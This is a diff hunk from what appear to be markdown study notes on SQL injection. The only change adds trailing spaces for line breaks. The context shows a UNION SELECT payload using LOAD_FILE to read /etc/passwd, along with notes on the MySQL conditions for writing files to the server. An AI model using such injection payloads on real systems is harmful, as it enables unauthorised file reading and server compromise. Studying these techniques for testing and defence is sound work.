@@ -228,16 +228,16 @@ SELECT LOAD_FILE('/etc/passwd');
 # Example Injection Statement
 cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- 
 ```
-### Writing Files
+### Writing Files  
 3 Requirements:
 1. File Privilige
 2. MySQL global secure_file_prive variable not enabled
 3. Write access to the location we want to write to on the server
 
 **secure_file_priv**
-NULL = No access to anything
-Path = can only read/write to/from that folder
-Blank = read/write entire file system
+NULL = No access to anything  
+Path = can only read/write to/from that folder  
+Blank = read/write entire file system  
 ```sql
 # Example Direct Query
 SHOW VARIABLES LIKE 'secure_file_priv';
